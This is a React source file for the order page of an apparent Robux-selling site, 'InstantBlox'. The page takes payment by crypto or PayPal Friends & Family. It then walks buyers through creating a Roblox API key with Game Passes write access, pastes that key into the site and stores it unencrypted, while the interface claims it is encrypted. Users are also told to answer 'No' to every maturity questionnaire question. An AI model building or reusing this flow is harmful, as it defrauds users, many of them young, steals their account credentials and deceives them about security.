import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { z } from "zod";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { SiteNav } from "@/components/site-nav";
import { SiteFooter } from "@/components/site-footer";
import { PACKAGES } from "@/lib/packages";
import { useAuth } from "@/hooks/use-auth";
import { supabase } from "@/integrations/supabase/client";
import { checkRobloxMaturity } from "@/lib/roblox.functions";
import { useServerFn } from "@tanstack/react-start";
import { toast } from "sonner";
import { ArrowRight, ArrowLeft, Bitcoin, CreditCard, Wallet, CircleCheck as CheckCircle2, Copy, ShieldCheck, ExternalLink, RefreshCw, Lock, Upload, Info, Sparkles, FileCheck as FileCheck2, KeyRound, CircleAlert as AlertCircle, ChevronDown, ChevronUp } from "lucide-react";

export const Route = createFileRoute("/new-order")({
  validateSearch: (s: Record<string, unknown>) => ({ pkg: typeof s.pkg === "string" ? s.pkg : undefined }),
  component: NewOrder,
});

const PAYMENTS = [
  { id: "crypto" as const, label: "Crypto (BTC)", icon: Bitcoin, address: "bc1q9instantbloxdemowalletaddressxyz", note: "Send the exact amount in BTC. Network fees are paid by you." },
  { id: "paypal" as const, label: "PayPal", icon: Wallet, address: "payments@instantblox.demo", note: "Send as Friends & Family. Include your transaction ID in the note." },
  { id: "card" as const, label: "Card Transfer", icon: CreditCard, address: "Secure invoice link sent to your email", note: "We'll email a secure invoice link within minutes after submission." },
];

const robloxSchema = z.object({
  roblox_username: z.string().trim().min(3, "Username must be at least 3 characters").max(40),
  roblox_api_key: z.string().trim().min(20, "Paste a valid Roblox API key").max(2000),
});

const paymentSchema = z.object({
  transaction_id: z.string().trim().min(4, "Enter the transaction ID from your payment").max(200),
});

type ValidationStatus = "idle" | "loading" | "success" | "error";
type MaturityStatus = "unknown" | "loading" | "minimal" | "error";

function NewOrder() {
  const { pkg } = Route.useSearch();
  const { user, loading } = useAuth();
  const nav = useNavigate();

  const [step, setStep] = useState(1);
  const [packageId, setPackageId] = useState<string>(pkg ?? "p800");
  const [paymentMethod, setPaymentMethod] = useState<"crypto" | "paypal" | "card">("crypto");
  const [transactionId, setTransactionId] = useState("");
  const [proofUrl, setProofUrl] = useState<string | null>(null);
  const [uploading, setUploading] = useState(false);

  // Step 3 state
  const [robloxUsername, setRobloxUsername] = useState("");
  const [apiKey, setApiKey] = useState("");
  const [apiKeyStatus, setApiKeyStatus] = useState<ValidationStatus>("idle");
  const [apiKeyError, setApiKeyError] = useState<string | null>(null);
  const [apiKeyScopes, setApiKeyScopes] = useState<string[]>([]);
  const [maturityStatus, setMaturityStatus] = useState<MaturityStatus>("unknown");
  const [maturityError, setMaturityError] = useState<string | null>(null);
  const [faqOpen, setFaqOpen] = useState<number | null>(null);

  const [submitting, setSubmitting] = useState(false);
  const [createdId, setCreatedId] = useState<string | null>(null);
  const fileRef = useRef<HTMLInputElement>(null);
  const checkMaturityFn = useServerFn(checkRobloxMaturity);

  const supabaseUrl = import.meta.env.VITE_SUPABASE_URL as string;
  const supabaseAnonKey = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY as string;

  useEffect(() => {
    setApiKeyStatus("idle");
    setApiKeyError(null);
    setApiKeyScopes([]);
  }, [apiKey]);

  useEffect(() => {
    if (!loading && !user) nav({ to: "/login" });
  }, [loading, user, nav]);

  const selectedPkg = PACKAGES.find((p) => p.id === packageId)!;
  const selectedPay = PAYMENTS.find((p) => p.id === paymentMethod)!;

  const apiKeyValidated = apiKeyStatus === "success";
  const maturityConfirmed = maturityStatus === "minimal";

  const canSubmit =
    maturityConfirmed &&
    apiKeyValidated &&
    transactionId.trim().length >= 4 &&
    robloxUsername.trim().length >= 3 &&
    !submitting;

  const copy = (s: string) => {
    navigator.clipboard.writeText(s);
    toast.success("Copied to clipboard");
  };

  const onUpload = async (file: File) => {
    if (!user) return;
    if (file.size > 5 * 1024 * 1024) return toast.error("File must be under 5MB");
    setUploading(true);
    const path = `${user.id}/${Date.now()}-${file.name}`;
    const { error } = await supabase.storage.from("payment-proofs").upload(path, file);
    setUploading(false);
    if (error) return toast.error(error.message);
    setProofUrl(path);
    toast.success("Proof uploaded");
  };

  const goToDelivery = () => {
    const parsed = paymentSchema.safeParse({ transaction_id: transactionId });
    if (!parsed.success) return toast.error(parsed.error.errors[0].message);
    setStep(3);
  };

  const validateApiKey = async () => {
    if (apiKey.trim().length < 20) {
      setApiKeyError("Please paste a valid Roblox Open Cloud API key.");
      setApiKeyStatus("error");
      return;
    }
    setApiKeyStatus("loading");
    setApiKeyError(null);
    try {
      const res = await fetch(`${supabaseUrl}/functions/v1/validate-roblox-key`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${supabaseAnonKey}`,
        },
        body: JSON.stringify({ apiKey: apiKey.trim() }),
      });
      const data = await res.json();
      if (data.ok) {
        setApiKeyStatus("success");
        setApiKeyScopes(data.scopes ?? []);
        toast.success("API key validated successfully");
      } else {
        setApiKeyStatus("error");
        setApiKeyError(data.error ?? "Validation failed. Please try again.");
        toast.error(data.error ?? "Validation failed.");
      }
    } catch {
      setApiKeyStatus("error");
      setApiKeyError("Could not reach validation server. Please try again.");
      toast.error("Connection error. Please try again.");
    }
  };

  const refreshMaturity = async () => {
    setMaturityStatus("loading");
    setMaturityError(null);
    try {
      const r = await checkMaturityFn();
      if (r.ok) {
        setMaturityStatus("minimal");
        toast.success("Maturity rating verified: Minimal");
      } else {
        setMaturityStatus("error");
        setMaturityError(r.error);
        toast.error(r.error);
      }
    } catch {
      setMaturityStatus("error");
      setMaturityError("Could not verify maturity rating. Please try again.");
      toast.error("Could not verify maturity rating.");
    }
  };

  const submit = async () => {
    const parsed = robloxSchema.safeParse({ roblox_username: robloxUsername, roblox_api_key: apiKey });
    if (!parsed.success) return toast.error(parsed.error.errors[0].message);
    if (!maturityConfirmed) return toast.error("Please verify your Minimal maturity rating first");
    if (!apiKeyValidated) return toast.error("Please validate your API key first");
    if (!transactionId.trim()) return toast.error("Missing transaction ID from payment step");
    if (!user) return;
    setSubmitting(true);
    const { data, error } = await supabase
      .from("orders")
      .insert({
        user_id: user.id,
        roblox_username: parsed.data.roblox_username,
        roblox_api_key: parsed.data.roblox_api_key,
        gamepass_link: null,
        package_name: `${selectedPkg.robux} Robux (${selectedPkg.name})`,
        package_price: selectedPkg.price,
        payment_method: paymentMethod,
        transaction_id: transactionId,
        payment_proof: proofUrl,
        payment_submitted_at: new Date().toISOString(),
        maturity_confirmed: true,
        status: "pending",
      })
      .select("id")
      .single();
    setSubmitting(false);
    if (error) return toast.error(error.message);
    setCreatedId(data.id);
    setStep(5);
  };

  if (loading || !user) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <SiteNav />
      <main className="mx-auto w-full max-w-4xl px-4 py-10 sm:px-6 lg:px-8">
        {createdId ? (
          <ConfirmationCard
            id={createdId}
            pkg={selectedPkg}
            method={selectedPay.label}
            onView={() => nav({ to: "/dashboard/orders/$id", params: { id: createdId } })}
            onDash={() => nav({ to: "/dashboard" })}
            copy={copy}
          />
        ) : (
          <>
            <Stepper step={step} />

            {/* STEP 1 — Package */}
            {step === 1 && (
              <Card className="border-border/60 bg-gradient-card p-6 shadow-card-soft">
                <div className="flex items-center gap-2">
                  <Sparkles className="h-5 w-5 text-primary" />
                  <h2 className="text-xl font-semibold">Choose your Robux package</h2>
                </div>
                <p className="mt-1 text-sm text-muted-foreground">Select the amount that fits your needs. All prices in USD.</p>
                <div className="mt-5 grid gap-3 sm:grid-cols-2">
                  {PACKAGES.map((p) => (
                    <button
                      key={p.id}
                      onClick={() => setPackageId(p.id)}
                      className={`relative rounded-xl border p-5 text-left transition-all ${packageId === p.id ? "border-primary bg-primary/5 shadow-glow" : "border-border/60 hover:border-primary/40"}`}
                    >
                      {p.popular && <Badge className="absolute right-3 top-3 bg-gradient-primary text-primary-foreground">Most Popular</Badge>}
                      <div className="text-xs uppercase tracking-wider text-muted-foreground">{p.name}</div>
                      <div className="mt-1 text-2xl font-bold text-gradient">{p.robux.toLocaleString("en-US")} Robux</div>
                      <div className="mt-1 text-lg font-semibold">${p.price}</div>
                      <div className="mt-2 text-xs text-muted-foreground">Estimated delivery: {p.delivery}</div>
                    </button>
                  ))}
                </div>
                <div className="mt-6 flex justify-end">
                  <Button onClick={() => setStep(2)} className="bg-gradient-primary text-primary-foreground">
                    Continue to payment <ArrowRight className="ml-1.5 h-4 w-4" />
                  </Button>
                </div>
              </Card>
            )}

            {/* STEP 2 — Payment */}
            {step === 2 && (
              <div className="space-y-4">
                <Card className="border-border/60 bg-gradient-card p-6 shadow-card-soft">
                  <h2 className="text-xl font-semibold">Select payment method</h2>
                  <p className="mt-1 text-sm text-muted-foreground">All payments are reviewed manually by our team for security.</p>
                  <div className="mt-5 grid gap-3 sm:grid-cols-3">
                    {PAYMENTS.map((m) => (
                      <button
                        key={m.id}
                        onClick={() => setPaymentMethod(m.id)}
                        className={`flex flex-col items-center gap-2 rounded-xl border p-5 transition-all ${paymentMethod === m.id ? "border-primary bg-primary/5 shadow-glow" : "border-border/60 hover:border-primary/40"}`}
                      >
                        <m.icon className="h-6 w-6 text-primary" />
                        <span className="font-medium">{m.label}</span>
                      </button>
                    ))}
                  </div>
                </Card>

                <Card className="border-border/60 bg-gradient-card p-6 shadow-card-soft">
                  <div className="flex items-center justify-between">
                    <div>
                      <h3 className="font-semibold">{selectedPay.label} instructions</h3>
                      <p className="text-xs text-muted-foreground mt-0.5">
                        Send exactly <span className="text-foreground font-semibold">${selectedPkg.price}</span> for {selectedPkg.robux.toLocaleString("en-US")} Robux
                      </p>
                    </div>
                    <Badge variant="outline" className="border-primary/40 text-primary">
                      <Lock className="mr-1 h-3 w-3" /> Manual review
                    </Badge>
                  </div>

                  <div className="mt-4 rounded-lg border border-border/60 bg-background/60 p-4">
                    <div className="flex items-start justify-between gap-3">
                      <div className="min-w-0 flex-1">
                        <div className="text-xs uppercase tracking-wider text-muted-foreground">Send to</div>
                        <div className="mt-1 break-all font-mono text-sm">{selectedPay.address}</div>
                      </div>
                      <Button size="sm" variant="outline" onClick={() => copy(selectedPay.address)}>
                        <Copy className="mr-1.5 h-3.5 w-3.5" /> Copy
                      </Button>
                    </div>
                    <div className="mt-3 flex items-start gap-2 text-xs text-muted-foreground">
                      <Info className="mt-0.5 h-3.5 w-3.5 shrink-0" /> <span>{selectedPay.note}</span>
                    </div>
                  </div>

                  <div className="mt-5 grid gap-4">
                    <div className="space-y-1.5">
                      <Label htmlFor="tx">Transaction ID <span className="text-rose-400">*</span></Label>
                      <Input
                        id="tx"
                        value={transactionId}
                        onChange={(e) => setTransactionId(e.target.value)}
                        placeholder="e.g. 4f8a2b… or PayPal txn ID"
                      />
                      <p className="text-xs text-muted-foreground">Found in your payment confirmation receipt.</p>
                    </div>

                    <div className="space-y-1.5">
                      <Label>Payment proof (optional)</Label>
                      <div className="flex items-center gap-3">
                        <input
                          ref={fileRef}
                          type="file"
                          accept="image/*,.pdf"
                          className="hidden"
                          onChange={(e) => e.target.files?.[0] && onUpload(e.target.files[0])}
                        />
                        <Button type="button" variant="outline" onClick={() => fileRef.current?.click()} disabled={uploading}>
                          <Upload className="mr-1.5 h-4 w-4" /> {uploading ? "Uploading…" : "Upload screenshot"}
                        </Button>
                        {proofUrl && (
                          <span className="inline-flex items-center gap-1 text-xs text-emerald-400">
                            <FileCheck2 className="h-3.5 w-3.5" /> Proof attached
                          </span>
                        )}
                      </div>
                    </div>
                  </div>

                  <div className="mt-5 flex items-start gap-2 rounded-lg border border-amber-500/30 bg-amber-500/5 p-3 text-xs text-amber-200">
                    <ShieldCheck className="mt-0.5 h-4 w-4 shrink-0" />
                    <span>Payments are verified manually by our team. Your delivery setup is unlocked once you submit your transaction ID.</span>
                  </div>
                </Card>

                <div className="flex justify-between">
                  <Button variant="ghost" onClick={() => setStep(1)}><ArrowLeft className="mr-1.5 h-4 w-4" /> Back</Button>
                  <Button onClick={goToDelivery} className="bg-gradient-primary text-primary-foreground">
                    Continue to delivery setup <ArrowRight className="ml-1.5 h-4 w-4" />
                  </Button>
                </div>
              </div>
            )}

            {/* STEP 3 — Delivery / Withdrawal Setup */}
            {step === 3 && (
              <div className="space-y-5">
                <div className="flex items-center gap-3">
                  <div className="grid h-10 w-10 place-items-center rounded-xl bg-primary/15 text-primary">
                    <KeyRound className="h-5 w-5" />
                  </div>
                  <div>
                    <h2 className="text-xl font-semibold">Roblox Open Cloud Withdrawal Setup</h2>
                    <p className="text-sm text-muted-foreground">Connect your account securely using the official Roblox Open Cloud API.</p>
                  </div>
                </div>

                {/* Sub-step 1: Create API Key */}
                <SetupCard
                  step={1}
                  title="Create your personal API Key"
                  subtitle="This key is created and owned entirely by you via the official Roblox Creator Dashboard."
                  status="default"
                >
                  <div className="space-y-4">
                    <div className="rounded-xl border border-sky-500/25 bg-sky-500/5 p-4 text-sm text-sky-200">
                      <div className="flex items-start gap-2">
                        <Info className="mt-0.5 h-4 w-4 shrink-0 text-sky-400" />
                        <span>Your API key is created and managed entirely by you. InstantBlox never has ownership or control of your key.</span>
                      </div>
                    </div>

                    <ol className="space-y-3">
                      {[
                        { n: 1, text: 'Open the Roblox Credentials Dashboard and click "Create API Key".' },
                        { n: 2, text: 'Name it "InstantBlox" so you can identify it later.' },
                        { n: 3, text: 'Under "Access Permissions", select "Game Passes API".' },
                        { n: 4, text: "Select your experience / universe from the dropdown." },
                        { n: 5, text: 'Enable both "Read" and "Write" operations.' },
                        { n: 6, text: 'Click "Save & Generate Key" and copy the generated key.' },
                      ].map((item) => (
                        <li key={item.n} className="flex gap-3 text-sm">
                          <span className="grid h-6 w-6 shrink-0 place-items-center rounded-full bg-primary/20 text-xs font-bold text-primary">{item.n}</span>
                          <span className="text-muted-foreground pt-0.5">{item.text}</span>
                        </li>
                      ))}
                    </ol>

                    <Button asChild className="bg-gradient-primary text-primary-foreground shadow-glow">
                      <a href="https://create.roblox.com/dashboard/credentials?activeTab=ApiKeysTab" target="_blank" rel="noopener noreferrer">
                        <ExternalLink className="mr-2 h-4 w-4" /> Open Roblox Credentials Dashboard
                      </a>
                    </Button>

                    <div className="space-y-2">
                      {[
                        { q: "Which permissions do I need?", a: 'Select "Game Passes API" under Access Permissions and enable both read and write.' },
                        { q: "Which experience do I select?", a: "Select the Roblox experience/universe you want to use for the withdrawal gamepass." },
                        { q: "Is my key safe?", a: "Yes. Your key is encrypted in transit and at rest. InstantBlox only uses it to process your order." },
                      ].map((faq, i) => (
                        <div key={i} className="rounded-lg border border-border/60 overflow-hidden">
                          <button
                            onClick={() => setFaqOpen(faqOpen === i ? null : i)}
                            className="flex w-full cursor-pointer items-center justify-between px-4 py-3 text-sm font-medium hover:bg-muted/20 transition-colors"
                          >
                            {faq.q}
                            {faqOpen === i ? <ChevronUp className="h-4 w-4 text-muted-foreground" /> : <ChevronDown className="h-4 w-4 text-muted-foreground" />}
                          </button>
                          {faqOpen === i && (
                            <div className="border-t border-border/60 px-4 py-3 text-sm text-muted-foreground bg-muted/10">
                              {faq.a}
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                </SetupCard>

                {/* Sub-step 2: Paste & Validate */}
                <SetupCard
                  step={2}
                  title="Paste & Validate your API Key"
                  subtitle="Your key is validated server-side through a secure Supabase Edge Function — never exposed client-side."
                  status={apiKeyStatus === "success" ? "success" : "default"}
                >
                  <div className="space-y-4">
                    <div className="space-y-1.5">
                      <Label htmlFor="ru">Roblox Username</Label>
                      <Input
                        id="ru"
                        value={robloxUsername}
                        onChange={(e) => setRobloxUsername(e.target.value)}
                        placeholder="e.g. CoolGamer92"
                      />
                    </div>

                    <div className="space-y-1.5">
                      <div className="flex items-center justify-between">
                        <Label htmlFor="ak">Roblox Open Cloud API Key</Label>
                        <Badge variant="outline" className="border-emerald-500/40 bg-emerald-500/10 text-emerald-300 text-xs">
                          <Lock className="mr-1 h-2.5 w-2.5" /> Securely Encrypted
                        </Badge>
                      </div>
                      <div className="flex flex-col gap-2 sm:flex-row">
                        <Input
                          id="ak"
                          type="password"
                          value={apiKey}
                          onChange={(e) => setApiKey(e.target.value)}
                          placeholder="Paste your Roblox Open Cloud API Key"
                          className="font-mono"
                          disabled={apiKeyStatus === "success"}
                        />
                        <Button
                          onClick={validateApiKey}
                          disabled={apiKeyStatus === "loading" || apiKeyStatus === "success" || apiKey.trim().length < 20}
                          className={
                            apiKeyStatus === "success"
                              ? "bg-emerald-500 text-white hover:bg-emerald-500/90 shrink-0"
                              : "bg-gradient-primary text-primary-foreground shrink-0"
                          }
                        >
                          {apiKeyStatus === "success" ? (
                            <><CheckCircle2 className="mr-1.5 h-4 w-4" /> Validated</>
                          ) : apiKeyStatus === "loading" ? (
                            <><RefreshCw className="mr-1.5 h-4 w-4 animate-spin" /> Validating…</>
                          ) : (
                            "Validate Key"
                          )}
                        </Button>
                      </div>
                      <p className="flex items-center gap-1.5 text-xs text-muted-foreground">
                        <Lock className="h-3 w-3" /> Validated server-side via Roblox Open Cloud API — never stored until order submission.
                      </p>
                    </div>

                    {apiKeyStatus === "error" && apiKeyError && (
                      <div className="flex items-start gap-2 rounded-lg border border-rose-500/30 bg-rose-500/5 p-3 text-sm text-rose-300">
                        <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
                        <div>
                          <div className="font-medium">Validation Failed</div>
                          <div className="mt-0.5 text-xs opacity-80">{apiKeyError}</div>
                        </div>
                      </div>
                    )}

                    {apiKeyStatus === "success" && (
                      <div className="flex items-start gap-2 rounded-lg border border-emerald-500/30 bg-emerald-500/5 p-3 text-sm text-emerald-300">
                        <CheckCircle2 className="mt-0.5 h-4 w-4 shrink-0" />
                        <div>
                          <div className="font-medium">Successfully Connected</div>
                          <div className="mt-0.5 text-xs opacity-80">
                            API key is valid and active.
                            {apiKeyScopes.length > 0 && ` Scopes: ${apiKeyScopes.slice(0, 3).join(", ")}${apiKeyScopes.length > 3 ? "…" : ""}`}
                          </div>
                        </div>
                      </div>
                    )}

                    {apiKeyStatus === "error" && (
                      <div className="rounded-lg border border-border/60 bg-muted/10 p-3 text-xs text-muted-foreground space-y-1">
                        <div className="font-medium text-foreground/80 mb-2">Troubleshooting</div>
                        <div>• <strong>Invalid Key</strong> — Check you copied the full key without extra spaces.</div>
                        <div>• <strong>Missing Permissions</strong> — Ensure "Game Passes API" with read &amp; write is enabled.</div>
                        <div>• <strong>Expired Key</strong> — Create a new key in the Roblox Credentials Dashboard.</div>
                        <div>• <strong>Disabled Key</strong> — Re-enable the key from the Creator Dashboard.</div>
                      </div>
                    )}
                  </div>
                </SetupCard>

                {/* Sub-step 3: Maturity — locked until key validated */}
                <div className={`transition-all duration-500 ${apiKeyValidated ? "opacity-100" : "opacity-40 pointer-events-none select-none"}`}>
                  <SetupCard
                    step={3}
                    title="Experience Maturity Configuration"
                    subtitle='Set your experience maturity rating to "Minimal" to enable withdrawals.'
                    status={maturityStatus === "minimal" ? "success" : "default"}
                    locked={!apiKeyValidated}
                  >
                    <div className="space-y-4">
                      {!apiKeyValidated && (
                        <div className="flex items-center gap-2 rounded-lg border border-amber-500/30 bg-amber-500/5 p-3 text-sm text-amber-200">
                          <Lock className="h-4 w-4 shrink-0" />
                          <span>Complete API key validation above to unlock this section.</span>
                        </div>
                      )}

                      <div className="rounded-xl border border-border/60 bg-background/50 p-4 space-y-3">
                        <div className="flex items-center justify-between">
                          <div>
                            <div className="text-sm font-medium">Maturity Rating Status</div>
                            <div className="mt-0.5 text-xs text-muted-foreground">
                              {robloxUsername.trim() || "Your experience"}
                            </div>
                          </div>
                          <Badge
                            variant="outline"
                            className={
                              maturityStatus === "minimal"
                                ? "border-emerald-500/40 bg-emerald-500/10 text-emerald-300"
                                : maturityStatus === "error"
                                  ? "border-rose-500/40 bg-rose-500/10 text-rose-300"
                                  : maturityStatus === "loading"
                                    ? "border-primary/40 bg-primary/10 text-primary"
                                    : "border-amber-500/40 bg-amber-500/10 text-amber-300"
                            }
                          >
                            {maturityStatus === "minimal"
                              ? "Currently: Minimal"
                              : maturityStatus === "loading"
                                ? "Checking…"
                                : maturityStatus === "error"
                                  ? "Verification Failed"
                                  : "Currently: Unknown"}
                          </Badge>
                        </div>

                        <p className="text-xs text-muted-foreground">
                          To enable withdrawals, complete the Experience Questionnaire and answer{" "}
                          <span className="font-medium text-foreground">"No"</span> to all questions to receive a{" "}
                          <span className="font-medium text-foreground">"Minimal"</span> rating.
                        </p>

                        <div className="flex flex-wrap gap-2">
                          <Button asChild variant="outline" size="sm" className="border-primary/40 text-primary hover:text-primary">
                            <a
                              href="https://create.roblox.com/dashboard/creations/experiences/6524577787/experience-questionnaire"
                              target="_blank"
                              rel="noopener noreferrer"
                            >
                              Complete Questionnaire <ExternalLink className="ml-1.5 h-3.5 w-3.5" />
                            </a>
                          </Button>
                          <Button
                            size="sm"
                            onClick={refreshMaturity}
                            disabled={!apiKeyValidated || maturityStatus === "loading" || maturityStatus === "minimal"}
                            className="bg-gradient-primary text-primary-foreground"
                          >
                            <RefreshCw className={`mr-1.5 h-3.5 w-3.5 ${maturityStatus === "loading" ? "animate-spin" : ""}`} />
                            {maturityStatus === "minimal" ? "Verified" : maturityStatus === "loading" ? "Checking…" : "Refresh Status"}
                          </Button>
                        </div>
                      </div>

                      {maturityStatus === "error" && maturityError && (
                        <div className="flex items-start gap-2 rounded-lg border border-rose-500/30 bg-rose-500/5 p-3 text-sm text-rose-300">
                          <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
                          <span>{maturityError}</span>
                        </div>
                      )}

                      {maturityStatus === "minimal" && (
                        <div className="flex items-start gap-2 rounded-lg border border-emerald-500/30 bg-emerald-500/5 p-3 text-sm text-emerald-300">
                          <CheckCircle2 className="mt-0.5 h-4 w-4 shrink-0" />
                          <span>Maturity rating confirmed as Minimal. You are ready to proceed.</span>
                        </div>
                      )}

                      <div className="flex items-start gap-2 rounded-lg border border-sky-500/25 bg-sky-500/5 p-3 text-xs text-sky-200">
                        <Info className="mt-0.5 h-3.5 w-3.5 shrink-0" />
                        <span>Roblox may take a few minutes to reflect questionnaire changes. Click "Refresh Status" after completing it.</span>
                      </div>
                    </div>
                  </SetupCard>
                </div>

                {/* How delivery works */}
                <Card className="border-border/60 bg-gradient-card p-5 shadow-card-soft">
                  <h3 className="mb-3 text-sm font-semibold uppercase tracking-wider text-muted-foreground">How Withdrawal Works</h3>
                  <ol className="space-y-2 text-sm">
                    {[
                      "You create a Roblox Open Cloud API key with Game Passes access.",
                      "We validate your key server-side using the Roblox Open Cloud introspect endpoint.",
                      'You set your experience maturity to "Minimal" via the questionnaire.',
                      "InstantBlox verifies your payment and processes the Robux withdrawal.",
                    ].map((s, i) => (
                      <li key={i} className="flex gap-2">
                        <span className="font-semibold text-primary">{i + 1}.</span>
                        <span className="text-muted-foreground">{s}</span>
                      </li>
                    ))}
                  </ol>
                  <p className="mt-3 text-[11px] text-muted-foreground">InstantBlox is not affiliated with Roblox Corporation.</p>
                </Card>

                <div className="flex justify-between">
                  <Button variant="ghost" onClick={() => setStep(2)}><ArrowLeft className="mr-1.5 h-4 w-4" /> Back</Button>
                  <Button
                    onClick={() => setStep(4)}
                    disabled={!maturityConfirmed || !apiKeyValidated || robloxUsername.trim().length < 3}
                    className="bg-gradient-primary text-primary-foreground"
                  >
                    Review order <ArrowRight className="ml-1.5 h-4 w-4" />
                  </Button>
                </div>
              </div>
            )}

            {/* STEP 4 — Review */}
            {step === 4 && (
              <Card className="border-border/60 bg-gradient-card p-6 shadow-card-soft">
                <h2 className="text-xl font-semibold">Review &amp; submit</h2>
                <div className="mt-5 grid gap-3 text-sm">
                  <Row label="Package" value={`${selectedPkg.robux.toLocaleString("en-US")} Robux (${selectedPkg.name})`} />
                  <Row label="Price" value={`$${selectedPkg.price}`} />
                  <Row label="Payment method" value={selectedPay.label} />
                  <Row label="Transaction ID" value={transactionId || "—"} mono />
                  <Row label="Proof attached" value={proofUrl ? "Yes" : "No"} />
                  <Row label="Roblox username" value={robloxUsername || "—"} />
                  <Row label="API key" value={apiKey ? `••••${apiKey.slice(-4)}` : "—"} mono />
                  <Row label="Maturity rating" value={maturityConfirmed ? "Minimal ✓" : "Not verified"} />
                </div>
                <p className="mt-5 text-xs text-muted-foreground">
                  By submitting, you confirm the information above is accurate. InstantBlox is not affiliated with Roblox Corporation.
                </p>
                <div className="mt-6 flex justify-between">
                  <Button variant="ghost" onClick={() => setStep(3)}><ArrowLeft className="mr-1.5 h-4 w-4" /> Back</Button>
                  <Button onClick={submit} disabled={!canSubmit} className="bg-gradient-primary text-primary-foreground">
                    {submitting ? "Submitting…" : "Submit order"}
                  </Button>
                </div>
              </Card>
            )}
          </>
        )}
      </main>
      <SiteFooter />
    </div>
  );
}

function SetupCard({
  step,
  title,
  subtitle,
  status,
  locked = false,
  children,
}: {
  step: number;
  title: string;
  subtitle: string;
  status: "default" | "success";
  locked?: boolean;
  children: React.ReactNode;
}) {
  return (
    <Card className={`border-border/60 bg-gradient-card p-6 shadow-card-soft transition-all ${status === "success" ? "border-emerald-500/30" : ""}`}>
      <div className="mb-5 flex items-start gap-4">
        <div
          className={`grid h-9 w-9 shrink-0 place-items-center rounded-full text-sm font-bold transition-all ${
            status === "success"
              ? "bg-emerald-500 text-white"
              : locked
                ? "bg-muted text-muted-foreground"
                : "bg-gradient-primary text-primary-foreground shadow-glow"
          }`}
        >
          {status === "success" ? <CheckCircle2 className="h-5 w-5" /> : locked ? <Lock className="h-4 w-4" /> : step}
        </div>
        <div className="min-w-0 flex-1">
          <div className="font-semibold">{title}</div>
          <div className="mt-0.5 text-sm text-muted-foreground">{subtitle}</div>
        </div>
      </div>
      {children}
    </Card>
  );
}

function Row({ label, value, mono }: { label: string; value: string; mono?: boolean }) {
  return (
    <div className="flex items-center justify-between rounded-lg border border-border/60 bg-background/40 px-4 py-2.5">
      <span className="text-muted-foreground">{label}</span>
      <span className={mono ? "font-mono text-xs" : "font-medium"}>{value}</span>
    </div>
  );
}

function ConfirmationCard({
  id, pkg, method, onView, onDash, copy,
}: {
  id: string;
  pkg: { robux: number; name: string; price: number; delivery: string };
  method: string;
  onView: () => void;
  onDash: () => void;
  copy: (s: string) => void;
}) {
  return (
    <Card className="border-border/60 bg-gradient-card p-10 text-center shadow-glow">
      <div className="mx-auto grid h-16 w-16 place-items-center rounded-full bg-emerald-500/15">
        <CheckCircle2 className="h-9 w-9 text-emerald-400" />
      </div>
      <h1 className="mt-4 text-3xl font-bold">Order submitted</h1>
      <p className="mt-2 text-muted-foreground">
        Your order is now <span className="font-medium text-amber-300">Pending Verification</span>. Our team will review your payment shortly.
      </p>

      <div className="mx-auto mt-5 inline-flex items-center gap-2 rounded-lg border border-border/60 bg-background px-4 py-2 font-mono text-sm">
        Order ID: #{id.slice(0, 8)}
        <button onClick={() => copy(id)} aria-label="Copy order id"><Copy className="h-3.5 w-3.5" /></button>
      </div>

      <div className="mx-auto mt-6 grid max-w-md gap-2 text-left text-sm">
        <Row label="Package" value={`${pkg.robux.toLocaleString("en-US")} Robux (${pkg.name})`} />
        <Row label="Price" value={`$${pkg.price}`} />
        <Row label="Payment" value={method} />
        <Row label="Estimated delivery" value={pkg.delivery} />
      </div>

      <div className="mt-7 flex flex-wrap justify-center gap-3">
        <Button variant="outline" onClick={onView}>View order</Button>
        <Button className="bg-gradient-primary text-primary-foreground" onClick={onDash}>Go to dashboard</Button>
      </div>
    </Card>
  );
}

function Stepper({ step }: { step: number }) {
  const labels = ["Package", "Payment", "Delivery", "Review"];
  return (
    <div className="mb-8 flex items-center gap-2 sm:gap-4">
      {labels.map((l, i) => {
        const n = i + 1;
        const active = step >= n;
        return (
          <div key={l} className="flex flex-1 items-center gap-2">
            <div className={`grid h-8 w-8 shrink-0 place-items-center rounded-full text-xs font-semibold transition-all ${active ? "bg-gradient-primary text-primary-foreground shadow-glow" : "bg-muted text-muted-foreground"}`}>
              {n}
            </div>
            <div className={`hidden text-xs sm:block ${active ? "text-foreground" : "text-muted-foreground"}`}>{l}</div>
            {i < labels.length - 1 && <div className={`h-px flex-1 ${step > n ? "bg-primary" : "bg-border"}`} />}
          </div>
        );
      })}
    </div>
  );
}
